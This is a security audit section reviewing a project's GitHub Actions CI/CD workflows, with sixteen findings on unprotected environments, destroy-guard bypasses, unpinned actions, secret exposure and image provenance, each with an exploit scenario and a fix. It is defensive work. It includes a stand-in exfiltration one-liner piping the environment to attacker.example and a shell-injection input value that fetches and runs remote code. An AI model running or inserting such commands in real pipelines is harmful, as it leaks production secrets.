# S20 — CI/CD & GitHub Actions

**Scope reviewed:** `.github/workflows/{build,release,multi-cloud-deployment,multi-cloud-destroy,codeql,ai-evals}.yml`, `.github/actions/{setup,fetch-frontend-build}/action.yml`, `.github/dependabot.yml`, `lefthook.yml`.
**Method:** read each workflow end to end and traced job dependency graphs (`needs` / `if:` / `always()`), triggers, permissions, environments, secret scoping and `${{ }}` interpolation into `run:` blocks. GitHub repository settings (environment reviewers, branch rules, OIDC federated-credential subjects) are not visible in the repo, so findings that depend on them are marked `PLAUSIBLE`. No workflow was executed.

## S20-01 — `production` (and `dev`) GitHub environments are unprotected; the "approval gate" and "main only" guards live inside attacker-editable YAML
- **Severity:** High
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:144,216-230,232-248,423-431,471-490`; `.github/workflows/release.yml:171-182,290-302`; `.github/workflows/multi-cloud-destroy.yml:136,294,344,491,571,638,727`
- **Description:** The workflow's own comments state that "The `production` environment is unprotected" (line 144) and that deploy jobs use "the unprotected `production` environment (secrets only)" (lines 216-218). The only human approval is the separate `production-approval` environment, which is bound to a single no-op job (`approval-gate`, and `approve` in `release.yml`). Environment secrets (`DATABASE_URL`, `DIRECT_URL`, `BETTER_AUTH_SECRET`, `CLOUDFLARE_API_TOKEN`, Chargebee/SMTP/admin credentials, `AZURE_*` OIDC identifiers) and the Azure OIDC subject (`environment:production`) are released to any job that declares `environment: production`, from any branch, with no reviewer and no deployment-branch policy. The "must run from main" check (line 145) and the `approval-gate` job are ordinary steps/jobs in the workflow file, and for `workflow_dispatch` or `pull_request` runs GitHub uses the workflow file from the pushed branch, so whoever controls the branch controls them.
- **Exploit scenario:** A collaborator with write access (or a stolen write-scoped token / compromised maintainer account) pushes a branch containing a copy of the workflow with a job `environment: production` plus `run: env | base64 | curl -d @- https://attacker.example` (or `azure/login` followed by `az` commands), then dispatches it. No approval prompt appears because the reviewers are attached only to `production-approval`, which the attacker's job simply does not use. The attacker obtains the production database URL, auth signing secret, Cloudflare API token and an Azure OIDC token, i.e. full takeover of production data and infrastructure. The same applies to `dev`.
- **Recommended fix:** In repository settings, put required reviewers (with "prevent self-review") and a *deployment branch policy* (`main` and the `v*` tags only) directly on the `production` environment, and attach every job that consumes production secrets to it (drop the split `production-approval` design, or keep it and add the same restrictions to `production`). Scope the Azure federated credential subject to `repo:<org>/dculus-forms:environment:production` combined with the branch policy, and use separate Azure app registrations and Cloudflare tokens per environment. Add a CODEOWNERS entry plus a ruleset that requires review for `.github/workflows/**`.

## S20-02 — Destroy workflow: confirmation guard is bypassed because downstream jobs use `always()` and never check `validate-destroy-request`
- **Severity:** High
- **File:line:** `.github/workflows/multi-cloud-destroy.yml:55-80,292-293,336-344,483-491,563-571,630-637,719-726`
- **Description:** The only safeguard is the `validate-destroy-request` job, which exits 1 if the typed text is not `DESTROY-<env>` (lines 66-77). Its `confirmed` output (line 60) is never consumed anywhere (`grep confirmed` finds only lines 60 and 80), and none of the destroy jobs test `needs.validate-destroy-request.result`. Trace with a wrong or empty confirmation and `destroy_azure=true`: `validate` fails; `setup-azure-backend` (needs validate, implicit `success()`) is skipped; `cleanup-azure-custom-domain` (`if: destroy_azure == 'true'`, no status function) is skipped; `terraform-azure-destroy` has `if: always() && !cancelled() && (cleanup.result == 'success' || 'skipped') && destroy_azure == 'true'`, which is true, so it runs `terraform destroy -auto-approve` (line 447). The same pattern lets `terraform-cloudflare-pages-destroy`, `terraform-cloudflare-service-domain-destroy`, `terraform-cloudflare-destroy` (R2 buckets, all stored files) and `terraform-neon-destroy` (the database) run with a failed confirmation. The "at least one provider" check is in the same failed job and is likewise irrelevant. Additionally, there is no `main`-only guard (contrast `multi-cloud-deployment.yml:144-147`), no reviewer-protected environment (see S20-01) and no `concurrency` group, so a destroy can run from any branch and race a deploy on the same Terraform state.
- **Exploit scenario:** An operator mistypes (or deliberately omits) the confirmation, expecting the run to abort; instead production R2 buckets, Cloudflare Pages projects, the container app and, if ticked, the Neon database are destroyed. A malicious write-access user can trigger the same with a blank confirmation, and the "No backups exist" note in the summary (line 913) indicates data loss is permanent.
- **Recommended fix:** Add `needs.validate-destroy-request.result == 'success'` (and `outputs.confirmed == 'true'`) to every destroy job's `if:`, or remove `always()` and chain the jobs strictly. Bind the destroy jobs to a reviewer-protected environment restricted to `main`, add `if: github.ref == 'refs/heads/main'` for production, add a `concurrency` group shared with the deploy workflow, and consider removing `staging` (no matching infrastructure) from the choice list.

## S20-03 — `pull_request` trigger on the deploy workflow runs PR-controlled Terraform and workflow steps with cloud credentials and dev secrets
- **Severity:** Medium (PLAUSIBLE: depends on whether the `dev` environment restricts deployment branches)
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:59-64,91-113,471-540`
- **Description:** The workflow triggers on `pull_request` for `infrastructure/multi-cloud/terraform/**` and the workflow file itself. For a same-repo PR, `determine-environment` sets `should_deploy=false` and `is_same_repo=true`; `terraform-infrastructure-deploy` has `if: always() && !cancelled() && !failure() && is_same_repo == 'true' && ...` (lines 485-489), so it runs even though its `needs` (`setup-azure-backend`, `run-migrations`) are skipped. It declares `environment: dev` (so environment secrets are released), logs into Azure via OIDC, fetches the shared Terraform-state storage account key (S20-04), and runs `terraform init/plan` from the checked-out PR tree: `main.tf`, `variables.tf` and the other copied `.tf` files are attacker-editable (`external` data source, `local-exec`, provider overrides), as is the workflow file itself. The same job also receives `DATABASE_URL`, `DIRECT_URL`, `BETTER_AUTH_SECRET`, SMTP, Chargebee and Cloudflare tokens as `TF_VAR_*` (lines 537-640).
- **Exploit scenario:** A collaborator opens a same-repo PR touching a `.tf` file that adds `data "external"` which reads `ARM_ACCESS_KEY` / `TF_VAR_*` from the environment and posts them out. CI exfiltrates the dev secrets and the storage account key without any approval, merge or review. Fork PRs are correctly blocked.
- **Recommended fix:** Remove the `pull_request` trigger from the credentialed job; run `terraform fmt/validate` (no backend, no credentials) on PRs, and run plan against real state only from `main` or a reviewer-protected environment with a read-only identity. If PR plans are wanted, use a dedicated read-only OIDC identity scoped to `pull_request` and a plan-only Cloudflare token.

## S20-04 — Terraform state storage account key (all environments) is fetched in every deploy job
- **Severity:** Medium
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:514-523,745-753,845-852,1095-1102,1331-1338`; `.github/workflows/multi-cloud-destroy.yml` (equivalent steps)
- **Description:** Each Terraform job runs `az storage account keys list ... dculusterraformstates` and exports `ARM_ACCESS_KEY`. One storage account holds the state containers for dev and production (`dculus-forms-azure-backend-<env>-state`, `...cloudflare-r2-<env>-state`, ...). Account keys grant full data-plane access to every container regardless of environment, so any job that runs in the `dev` environment (including PR plans, see S20-03) can read production state. Azure and Cloudflare terraform state routinely contains plaintext secrets (container-app secret values, `r2_secret_access_key`, `TF_VAR_*` values). The key can also be used to tamper with production state.
- **Exploit scenario:** Code running in any dev-environment job reads `ARM_ACCESS_KEY` and downloads `dculus-forms-azure-backend-production-state/terraform.tfstate`, obtaining production secrets that were passed as variables.
- **Recommended fix:** Use `use_azuread_auth = true` in the azurerm backend with per-environment RBAC (`Storage Blob Data Contributor` on the environment's container only); disable shared-key access on the account; use separate storage accounts for dev and production; remove the key-listing step (and its need for `Microsoft.Storage/storageAccounts/listKeys/action` on the CI identity).

## S20-05 — Production migrations and Terraform run from the wrong commit
- **Severity:** Medium
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:432-469,496-500,729-760,820-890,1070-1140,1300-1375`; `.github/workflows/release.yml:290-302`
- **Description:** `run-migrations` (`actions/checkout@v4` with no `ref`, line 436) and the Terraform jobs (`actions/checkout@v4` with `path: dculus-forms`, no `ref`) check out `github.sha`. In a `workflow_call` that is the caller's SHA. For `release.yml` this is the current tip of `main` at dispatch time, not `needs.prepare.outputs.source_sha`, even though the backend image (retagged from `sha-<source_sha>`) and the frontends (release assets built from `source_sha`) are the older, dev-verified commit. Only the frontend fetch and the E2E job honor `release_commit`. Prisma migrations present on `main` but not in the released commit are therefore applied to the production database before the older image is started, and the Terraform configuration may also be newer than the verified one.
- **Exploit scenario:** A migration merged after the verified commit (unreviewed by the release approver, never exercised on dev together with the verified image) runs against production. A destructive or schema-incompatible migration breaks the old image or loses data; an attacker who lands a malicious commit on `main` after the release was approved gets code executed with the production `DATABASE_URL` (via `pnpm install` lifecycle scripts and `db:migrate:deploy`) without it appearing in the approved release.
- **Recommended fix:** Pass `ref: ${{ needs.determine-environment.outputs.release_commit }}` to every checkout in the deployment workflow that runs migrations or Terraform, and fail if the checked-out SHA differs from the release commit.

## S20-06 — Post-deploy E2E job exposes production DB credentials and auth secret to the whole job and runs against production
- **Severity:** Medium
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:1520-1546,1566-1594`
- **Description:** `run-form-app-e2e` has no `environment == 'dev'` condition (only the seeding step does, line 1578), so it also runs for production. Its job-level `env` includes `DATABASE_URL`, `DIRECT_URL` and `BETTER_AUTH_SECRET` (lines 1544-1546), visible to every step: `pnpm install --frozen-lockfile` (lifecycle scripts of all dependencies), `playwright install --with-deps`, and `pnpm test:e2e`. Those variables are only needed by the dev-only seed step. In production this means a dependency compromise (see S23) or a malicious test file gets the production DB URL and the secret that signs sessions; and E2E tests create accounts/forms in the production system using the `E2E_INTEGRATION_TEST_*` credentials.
- **Exploit scenario:** A compromised npm package with a postinstall script reads `process.env.DATABASE_URL` and `BETTER_AUTH_SECRET` during the production release job and exfiltrates them; with the auth secret the attacker forges sessions for any user.
- **Recommended fix:** Move `DATABASE_URL`, `DIRECT_URL` and `BETTER_AUTH_SECRET` into the `env:` of the dev-only seeding step; add `if: environment == 'dev'` to the whole E2E job (or use a dedicated read-only smoke test for production); run `pnpm install --ignore-scripts` where scripts are not needed.

## S20-07 — GitHub Actions are pinned to mutable tags (including those handling cloud and registry credentials); Dependabot does not cover Actions
- **Severity:** Medium
- **File:line:** all workflows; notably `build.yml:50` (`trufflesecurity/trufflehog@v3.95.5`), `build.yml:607-613` and `release.yml:195-200` (`docker/login-action@v3`), `multi-cloud-*.yml` (`azure/login@v2` x14, `hashicorp/setup-terraform@v3` x10), `.github/dependabot.yml`
- **Description:** Every `uses:` reference (about 100) is a tag or branch, none is a commit SHA. Tags on third-party actions can be force-moved if the publishing account or repo is compromised (as in the 2025 `tj-actions/changed-files` incident). `docker/login-action` receives the Docker Hub password, `azure/login` and `setup-terraform` run in jobs holding production credentials, and `trufflesecurity/trufflehog` runs with `fetch-depth: 0`. `dependabot.yml` only has the `npm` ecosystem, so even after pinning nothing would propose updates, and `pnpm/action-setup@v4` is used without a pinned version in several places.
- **Exploit scenario:** An upstream action tag is repointed to malicious code; the next production deploy run exfiltrates the Docker Hub token (letting the attacker push a backdoored `latest`/`vX.Y.Z` image) or the Azure OIDC token.
- **Recommended fix:** Pin all third-party actions (at least `docker/*`, `azure/login`, `hashicorp/setup-terraform`, `trufflesecurity/trufflehog`, `pnpm/action-setup`) to full commit SHAs with a trailing version comment, add `package-ecosystem: github-actions` to `dependabot.yml`, and enable the repository setting "Require actions to be pinned to a full-length commit SHA" plus an allow-list of actions.

## S20-08 — `build.yml` grants broad token permissions and cloud env to every job, including PR runs
- **Severity:** Medium
- **File:line:** `.github/workflows/build.yml:22-25,27-35`
- **Description:** The workflow-level `permissions` is `id-token: write`, `contents: write`, `packages: write`, inherited by every job that does not override it (all test/build jobs, which run on `pull_request`, execute `pnpm install` lifecycle scripts and run PR-supplied code). The top-level `env` also exports `ARM_CLIENT_ID`, `ARM_SUBSCRIPTION_ID`, `ARM_TENANT_ID` and `ARM_USE_OIDC` to all jobs, although none of those jobs uses Azure. For same-repo PRs the token really is write-capable (fork PRs are automatically downgraded). Code running in a PR job can push commits/tags to the repo with `GITHUB_TOKEN` (`persist-credentials: false` reduces but does not remove this, since the token is still available as `github.token`/in the runner environment) and can request an OIDC token for any Azure federated credential that trusts the `pull_request` or branch subject. `packages: write` is unused (images go to Docker Hub).
- **Exploit scenario:** A malicious dependency bump on a same-repo branch runs a postinstall script that uses the injected token to create a release tag or push to a protected-by-convention branch (if branch protection is lax), or mints an OIDC token to authenticate to Azure as the CI identity.
- **Recommended fix:** Set top-level `permissions: contents: read` and grant `id-token`/`packages`/`contents: write` only on the specific jobs that need them (`deploy-dev` already declares its own); move `ARM_*` to the Azure jobs; verify the federated credentials do not trust `pull_request` subjects.

## S20-09 — Secret scanning is non-blocking and weak; dependency audit is non-blocking; no pre-commit secret scan in a public repo
- **Severity:** Medium
- **File:line:** `.github/workflows/build.yml:49-56,117-119,713`; `lefthook.yml:1-5`; `package.json:109-115` (`lint-staged`)
- **Description:** (a) TruffleHog runs with `continue-on-error: true`, `--no-verification`, and `base: ${{ github.event.before || '' }}`; the job always reports success so `deploy-dev` (which `needs: security-scan`) never waits on a real result. On `pull_request` and manual dispatch `github.event.before` is empty, and for the first push to a branch it is the all-zero SHA, so the diff range is unreliable (PLAUSIBLE: the action may error out, which `continue-on-error` hides). `--exclude-paths` points at a non-existent `.github/workflows/ci.yml` and excludes `.env.example` and `docker-compose.yml`, which is where an accidental real secret would plausibly land. (b) `pnpm audit --audit-level=high` is `continue-on-error: true`, so known high/critical vulnerabilities never block a release. (c) `lefthook.yml` pre-commit runs only `lint-staged` (eslint); there is no gitleaks/trufflehog pre-commit hook, although CLAUDE.md states the repository is public and credentials must never be committed.
- **Exploit scenario:** A developer commits a real key in `.env.example` or a script; the scan either fails silently or is excluded, the green pipeline proceeds, and the key is public on GitHub within seconds.
- **Recommended fix:** Make secret scanning a required, failing check (remove `continue-on-error`, drop the `.env.example` exclusion or use an allow-list of known fake values, use `--only-verified` or `--fail`), enable GitHub secret scanning and push protection on the repository, add a `gitleaks protect --staged` pre-commit hook in `lefthook.yml`, and make `pnpm audit` blocking for runtime dependencies with a documented allow-list.

## S20-10 — Backend image is deployed by mutable tag with no digest pinning, signature or provenance verification; shipped image is not the tested artifact
- **Severity:** Medium
- **File:line:** `.github/workflows/build.yml:586-677`; `.github/workflows/release.yml:123,201-213`; `.github/workflows/multi-cloud-deployment.yml:383-421,585-680`
- **Description:** The image is built from source by `docker/build-push-action` (`COPY . .` then `pnpm build` in `apps/backend/Dockerfile`), independently of the `backend-dist-<sha>` artifact that unit/integration/E2E jobs exercised. It is pushed to Docker Hub as `sha-<commit>`, branch tags and `latest`. Release retags `sha-<SRC>` to `vX.Y.Z` (`imagetools create`), and the deploy workflow only checks `docker manifest inspect` for existence, then passes the tag to Terraform. Docker Hub tags are mutable, and nothing verifies a digest, cosign signature or build attestation between the dev deployment, the approval and the production rollout. Anyone holding the Docker Hub credential (`DOCKER_PASSWORD`, long-lived) can overwrite `sha-<SRC>` after dev verification and before the release retag, or overwrite `vX.Y.Z` afterwards. There is no SBOM or signing step.
- **Exploit scenario:** An attacker with the Docker Hub token (obtainable via S20-07 or S20-01) pushes a backdoored image under `sha-<SRC>` between the dev deploy and the production approval; release retags and deploys it, and nobody notices because the tag name and commit are unchanged.
- **Recommended fix:** Capture the image digest in `build-and-push` (`steps.<id>.outputs.digest`), record it as a workflow output / release asset, retag by digest in `release.yml`, and deploy `image@sha256:...` via Terraform; sign with cosign keyless (OIDC) or use `actions/attest-build-provenance` and verify the attestation before production deploy; use a scoped Docker Hub access token (push-only to the one repository) rather than an account password.

## S20-11 — Script injection sink: free-text `confirmation` input interpolated into shell
- **Severity:** Low
- **File:line:** `.github/workflows/multi-cloud-destroy.yml:67,806` (also `:66`, `:98-100`, `:803-806` for other `${{ github.event.inputs.* }}` / `${{ github.actor }}` in `run:`)
- **Description:** `ACTUAL="${{ github.event.inputs.confirmation }}"` and the `destroy-summary` job (`echo "... \`${{ github.event.inputs.confirmation }}\` verified"`) paste a free-form string input into a bash script. A value such as `"; curl evil|sh; "` is executed in the runner. `destroy-summary` runs with `if: always()` (line 797), so it executes even when validation failed. Practical impact is limited: only users who can dispatch the workflow (write access) can set the input, and these two jobs have no environment/secrets, but it is a standing pattern for the credentialed jobs, and the other interpolated values are `choice`/`boolean` typed. `multi-cloud-deployment.yml` interpolates `needs.terraform-*.outputs.service_domain`/`custom_domain` (Terraform outputs) into `run:` blocks (e.g. lines 1675, 1686); these are not attacker-controlled today.
- **Exploit scenario:** A user with write access dispatches the workflow with a crafted confirmation to run commands in a job; negligible gain beyond what they already hold, but combined with a future change that adds secrets or an environment to those jobs it becomes a credential theft path.
- **Recommended fix:** Pass inputs and outputs through `env:` and reference `"$VAR"` in the script; adopt the `release.yml` pattern; add a lint (e.g. `zizmor`/`actionlint`) to CI.

## S20-12 — Unpinned `npm install -g wrangler` immediately before a step holding the Cloudflare API token
- **Severity:** Low
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:958,1194,1430`
- **Description:** `npm install -g wrangler` fetches the latest version (and its transitive dependencies) at deploy time, and the next step runs it with `CLOUDFLARE_API_TOKEN` (an account-wide token also used to manage R2, DNS and Pages). A compromised wrangler release or dependency executes with that token.
- **Exploit scenario:** A malicious `wrangler` or dependency release is published; the next production deploy sends the Cloudflare token to the attacker.
- **Recommended fix:** Pin the version (`wrangler@x.y.z`, ideally via a lockfile in the repo, or use `cloudflare/wrangler-action` pinned to a SHA), and use a Pages-deploy-scoped token separate from the DNS/R2 Terraform token.

## S20-13 — Secrets inlined into `run:` text, written to step outputs, and Terraform secrets exported to `GITHUB_ENV` unmasked
- **Severity:** Low
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:571-574,582-587,602-603`; `.github/workflows/multi-cloud-destroy.yml:710-713`
- **Description:** `${{ secrets.DATABASE_URL }}` is expanded into the script text for `::add-mask::` and then written to `GITHUB_OUTPUT` (`connection_string`, unused downstream); secrets are passed as `-var="cloudflare_api_token=${{ secrets.CLOUDFLARE_API_TOKEN }}"` (visible in the process list and breaks on values containing `"`/`$`); and `terraform output -raw r2_secret_access_key` / `r2_access_key_id` are appended to `GITHUB_ENV` without `::add-mask::`, so those generated values are not registered as secrets and would print in clear if any later step echoed `env` or enabled debug logging (the storage key correctly uses `::add-mask::`).
- **Exploit scenario:** A later debugging step or `ACTIONS_STEP_DEBUG` run prints the environment; the R2 access key pair appears in the public job log (the repository is public and logs are readable by anyone for public repos).
- **Recommended fix:** Use `TF_VAR_*` env only (already set) and drop `-var` flags; add `echo "::add-mask::$VALUE"` before writing Terraform outputs to `GITHUB_ENV`; remove the unused `connection_string` output; mark the Terraform outputs `sensitive = true`.

## S20-14 — Several credentialed jobs keep the checkout token persisted
- **Severity:** Low
- **File:line:** `.github/workflows/multi-cloud-deployment.yml:436,497-500,1555,1654`; `.github/workflows/multi-cloud-destroy.yml` (6 checkouts, none with `persist-credentials: false`); `.github/workflows/codeql.yml:48`; `.github/workflows/build.yml` (all use `false`)
- **Description:** `actions/checkout@v4` defaults to persisting the `GITHUB_TOKEN` in `.git/config`. These jobs then run `pnpm install` / `terraform` / third-party provider code (and, for E2E, PR-influenced test code) in the same workspace. Tokens are `contents: read` here so impact is low, but the pattern is inconsistent with `build.yml`/`release.yml`.
- **Exploit scenario:** A malicious dependency script reads the token from `.git/config` and uses it for read access to private data in the repository (low value for a public repo, but relevant if the repo ever goes private).
- **Recommended fix:** Set `persist-credentials: false` on every checkout that does not need to push.

## S20-15 — Release archives built with lifecycle scripts under a `contents: write` job; no checksums or attestation
- **Severity:** Low
- **File:line:** `.github/workflows/release.yml:233-288`
- **Description:** `package-assets` has `contents: write` and runs `pnpm install --prod --frozen-lockfile` (executing dependency lifecycle scripts) in the release workspace, then zips `node_modules` into `backend-build-<version>.zip` and uploads it to the public GitHub Release. The step that installs does not hold `GH_TOKEN` in its env (good), but the job token is available to the runner process. The archive contents (installed at release time) differ from what CI tested, and no SHA256 file, SBOM or provenance attestation accompanies the assets that self-hosters and the production frontends download (`fetch-frontend-build` extracts the zip into the Pages deploy without verifying a hash).
- **Exploit scenario:** A compromised dependency postinstall in the release job uses the `contents: write` token to modify the release (swap the frontend zips); production Pages then deploys the swapped assets.
- **Recommended fix:** Run the install with `--ignore-scripts` (or in a separate job with `contents: read`), upload with a distinct job holding the write token, publish a `SHA256SUMS` file and verify it in `fetch-frontend-build`, and add `actions/attest-build-provenance`.

## S20-16 — Docker image (including `latest`) is pushed before E2E completes; image push is not gated on the security scan
- **Severity:** Low
- **File:line:** `.github/workflows/build.yml:586-587,665-677,698-722`
- **Description:** `build-and-push` needs only `lint-and-type-check`, `build-backend`, `unit-tests-backend` and `integration-tests`; it does not need `e2e-local` or `security-scan`. On a main push the multi-arch image is therefore published to the public Docker Hub repository with the `latest` and `main` tags even if E2E fails or the secret scan flags something. `deploy-dev` does wait for E2E, but external consumers pulling `latest` (docs advertise `docker pull ...:latest`, `build.yml:691`) get an unverified build.
- **Exploit scenario:** A regression or an accidentally embedded secret (e.g. a file copied by `COPY . .`) is published to Docker Hub before the scan/E2E complete.
- **Recommended fix:** Add `e2e-local` and `security-scan` to `needs` of `build-and-push`, or push only the `sha-` tag first and add `latest` after `deploy-dev` succeeds.
